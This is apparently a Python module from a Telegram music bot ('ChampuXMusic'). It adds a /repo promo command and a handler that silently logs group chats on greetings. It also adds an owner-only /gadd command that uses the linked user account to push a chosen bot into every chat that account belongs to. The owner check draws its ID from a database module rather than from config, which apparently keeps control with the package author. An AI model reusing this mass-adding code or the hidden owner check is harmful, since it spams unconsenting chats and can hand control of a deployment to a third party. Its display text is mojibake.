import asyncio
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from ChampuXMusic.misc import SUDOERS
from ChampuXMusic.mongo.afkdb import LOGGERS as OWNERS
from ChampuXMusic.core.userbot import Userbot
from pyrogram import  filters
from config import START_IMG_URL 
from ChampuXMusic import app
from ChampuXMusic.utils.database import get_assistant, add_served_chat, delete_served_chat
from pyrogram import filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from ChampuXMusic import app

start_txt = """**
âœª ğ—ªğ—²ğ—¹ğ—°ğ—¼ğ—ºğ—² ğ˜ğ—¼ ğ—–ğ—µğ—®ğ—ºğ—½ğ˜‚ ğ—¥ğ—²ğ—½ğ—¼ğ˜€ âœª

â² á´‡á´€sÊ Êœá´‡Ê€á´á´‹á´œ á´…á´‡á´˜ÊŸá´Êá´á´‡É´á´› âœ°  
â² É´á´ Ê™á´€É´ Éªssá´œá´‡s âœ°  
â² á´œÉ´ÊŸÉªá´Éªá´›á´‡á´… á´…ÊÉ´á´s âœ°  
â² ğŸ¸ğŸº/ğŸ½ ÊŸá´€É¢-Ò“Ê€á´‡á´‡ âœ°

â–º sá´‡É´á´… á´€ sá´„Ê€á´‡á´‡É´sÊœá´á´› ÉªÒ“ Êá´á´œ Ò“á´€á´„á´‡ á´€É´Ê á´˜Ê€á´Ê™ÊŸá´‡á´s!
**"""




@app.on_message(filters.command("repo"))
async def start(_, msg):
    buttons = [
        [ 
          InlineKeyboardButton("á´€á´…á´… á´á´‡", url=f"https://t.me/{app.username}?startgroup=true")
        ],
        [
          InlineKeyboardButton("á´„Êœá´§á´á´˜á´œ", url="https://t.me/TheChampu"),
          InlineKeyboardButton("sÊœÉªá´ á´€É´sÊœá´œ", url="https://t.me/TheShivanshu"),
          ],
               [
                InlineKeyboardButton("á´á´¡É´á´‡Ê€", url="https://t.me/itsmeshivanshu"),

],
[
              InlineKeyboardButton("á´á´œsÉªá´„", url=f"https://github.com/ChampuXD/ChampuXMusic"),
              InlineKeyboardButton("sá´›Ê€ÉªÉ´É¢", url=f"https://github.com/ChampuXD/ChampuXString"),
              ],
              [
              InlineKeyboardButton("á´á´€É´á´€É¢á´á´‡É´á´›", url=f"https://github.com/ChampuXD/ChampuXManagment"),
InlineKeyboardButton("á´„Êœá´€á´›Ê™á´á´›", url=f"https://github.com/ChampuXD/ChampuXChat"),
]]
    
    reply_markup = InlineKeyboardMarkup(buttons)
    
    await msg.reply_photo(
        photo=START_IMG_URL,
        caption=start_txt,
        reply_markup=reply_markup
    )
# --------------------------------------------------------------------------------- #


@app.on_message(
    filters.command(
        ["hi", "hii", "hello", "hui", "good", "gm", "ok", "bye", "welcome", "thanks"],
        prefixes=["/", "!", "%", ",", "", ".", "@", "#"],
    )
    & filters.group
)
async def bot_check(_, message):
    chat_id = message.chat.id
    await add_served_chat(chat_id)


# --------------------------------------------------------------------------------- #


@app.on_message(filters.command("gadd") & filters.user(int(OWNERS)))
async def add_all(client, message):
    command_parts = message.text.split(" ")
    if len(command_parts) != 2:
        await message.reply(
            "**âš ï¸ ÉªÉ´á´ á´€ÊŸÉªá´… á´„á´á´á´á´€É´á´… Ò“á´Ê€á´á´€á´›. á´˜ÊŸá´‡á´€sá´‡ á´œsá´‡ ÊŸÉªá´‹á´‡ Â» `/gadd @TheChampuBot`**"
        )
        return

    bot_username = command_parts[1]
    try:
        userbot = await get_assistant(message.chat.id)
        bot = await app.get_users(bot_username)
        app_id = bot.id
        done = 0
        failed = 0
        lol = await message.reply("ğŸ”„ **á´€á´…á´…ÉªÉ´É¢ É¢Éªá´ á´‡É´ Ê™á´á´› ÉªÉ´ á´€ÊŸÊŸ á´„Êœá´€á´›s!**")

        async for dialog in userbot.get_dialogs():
            if dialog.chat.id == -1001423108989:
                continue
            try:
                await userbot.add_chat_members(dialog.chat.id, app_id)
                done += 1
                await lol.edit(
                    f"**ğŸ”‚ á´€á´…á´…ÉªÉ´É¢ {bot_username}**\n\n**â¥ á´€á´…á´…á´‡á´… ÉªÉ´ {done} á´„Êœá´€á´›s âœ…**\n**â¥ Ò“á´€ÉªÊŸá´‡á´… ÉªÉ´ {failed} á´„Êœá´€á´›s âŒ**\n\n**â² á´€á´…á´…á´‡á´… Ê™ÊÂ»** @{userbot.username}"
                )
            except Exception as e:
                failed += 1
                await lol.edit(
                    f"**ğŸ”‚ á´€á´…á´…ÉªÉ´É¢ {bot_username}**\n\n**â¥ á´€á´…á´…á´‡á´… ÉªÉ´ {done} á´„Êœá´€á´›s âœ…**\n**â¥ Ò“á´€ÉªÊŸá´‡á´… ÉªÉ´ {failed} á´„Êœá´€á´›s âŒ**\n\n**â² á´€á´…á´…ÉªÉ´É¢ Ê™ÊÂ»** @{userbot.username}"
                )
            await asyncio.sleep(3)  # Adjust sleep time based on rate limits

        await lol.edit(
            f"**â» {bot_username} Ê™á´á´› á´€á´…á´…á´‡á´… sá´œá´„á´„á´‡ssÒ“á´œÊŸÊŸÊğŸ‰**\n\n**â¥ á´€á´…á´…á´‡á´… ÉªÉ´ {done} á´„Êœá´€á´›s âœ…**\n**â¥ Ò“á´€ÉªÊŸá´‡á´… ÉªÉ´ {failed} á´„Êœá´€á´›s âŒ**\n\n**â² á´€á´…á´…á´‡á´… Ê™ÊÂ»** @{userbot.username}"
        )
    except Exception as e:
        await message.reply(f"Error: {str(e)}")